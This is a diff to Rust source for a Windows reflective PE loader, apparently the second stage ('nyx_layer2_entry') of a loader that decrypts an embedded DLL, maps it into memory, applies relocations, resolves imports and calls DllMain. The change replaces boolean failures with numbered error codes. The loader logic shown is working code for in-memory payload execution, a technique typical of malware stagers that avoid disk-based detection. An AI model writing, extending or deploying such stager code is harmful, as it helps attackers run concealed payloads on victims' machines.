@@ -585,19 +585,19 @@ fn pe_slice<'a>(image: &'a [u8], rva: u32, len: usize) -> Option<&'a [u8]> {
 /// # Safety
 /// `image` must be a valid PE32+ buffer of `image.len()` bytes. The `Bootstrap`
 /// function pointers must be live kernel32 exports.
-unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
+unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> u8 {
     if image.len() < 0x40 + 4 + 20 + 24 {
-        return false;
+        return 4;
     }
     // DOS header.
     let dos = unsafe { &*(image.as_ptr() as *const ImageDosHeader) };
     if dos.e_magic != 0x5A4D {
         // "MZ"
-        return false;
+        return 5;
     }
     let e_lfanew = dos.e_lfanew;
     if e_lfanew < 0 || (e_lfanew as usize) + 4 + 20 + 24 > image.len() {
-        return false;
+        return 6;
     }
     let nt_off = e_lfanew as usize;
     // "PE\0\0".
@@ -608,7 +608,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
         image[nt_off + 3],
     ]);
     if sig != 0x0000_4550 {
-        return false;
+        return 7;
     }
     let file_hdr_off = nt_off + 4;
     let file = unsafe {
@@ -616,12 +616,12 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
     };
     let opt_off = file_hdr_off + 20;
     if file.size_of_optional_header < 240 {
-        return false;
+        return 8;
     }
     let opt = unsafe { &*(image.as_ptr().add(opt_off) as *const ImageOptionalHeaderPe32Plus) };
     // PE32+ only.
     if opt.magic != 0x020B {
-        return false;
+        return 9;
     }
     let image_base_preferred = opt.image_base;
     let size_of_image = opt.size_of_image as usize;
@@ -633,7 +633,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
     // by VirtualAlloc (committed memory is zeroed).
     const MAX_IMAGE_SIZE: usize = 64 * 1024 * 1024;
     if size_of_image == 0 || size_of_image > MAX_IMAGE_SIZE {
-        return false;
+        return 10;
     }
     let entry_rva = opt.address_of_entry_point as usize;
     let size_of_headers = opt.size_of_headers as usize;
@@ -649,7 +649,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
         )
     };
     if base.is_null() {
-        return false;
+        return 11;
     }
     let base_u8 = base as *mut u8;
     // SAFETY: base is a freshly-allocated, zeroed (VirtualAlloc zeroes committed
@@ -664,7 +664,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
     let sect_off = opt_off + file.size_of_optional_header as usize;
     let n_sect = file.number_of_sections as usize;
     if nsect_check(n_sect, sect_off, image.len()).is_none() {
-        return false;
+        return 12;
     }
     for i in 0..n_sect {
         let s_off = sect_off + i * 40;
@@ -715,7 +715,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
         ]);
         if reloc_dir_rva != 0 && reloc_dir_size != 0 {
             if !apply_relocs(mapped, reloc_dir_rva as usize, reloc_dir_size as usize, delta) {
-                return false;
+                return 13;
             }
         }
     }
@@ -736,7 +736,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
     ]);
     if imp_dir_rva != 0 && imp_dir_size != 0 {
         if !resolve_imports(mapped, imp_dir_rva as usize, imp_dir_size as usize, boot) {
-            return false;
+            return 14;
         }
     }
 
@@ -750,7 +750,7 @@ unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
     // SAFETY: entry_va is the resolved DllMain per the PE entry point; calling
     // it with DLL_PROCESS_ATTACH is the standard reflective-load terminator.
     let _ = unsafe { dll_main(base as *const c_void, DLL_PROCESS_ATTACH, core::ptr::null()) };
-    true
+    0
 }
 
 /// Defensive bounds check that the section table fits in the image.
@@ -1044,11 +1044,7 @@ pub extern "C" fn nyx_layer2_entry(
     // ── 4. Reflective load + DllMain. ──────────────────────────────────────
     // SAFETY: out holds a valid decrypted PE of ct_len bytes; boot is live.
     let image = unsafe { core::slice::from_raw_parts(out as *const u8, ct_len) };
-    if unsafe { reflective_load(image, &boot) } {
-        0
-    } else {
-        3
-    }
+    unsafe { reflective_load(image, &boot) as usize }
 }
 
 // ── Panic handler ──────────────────────────────────────────────────────────
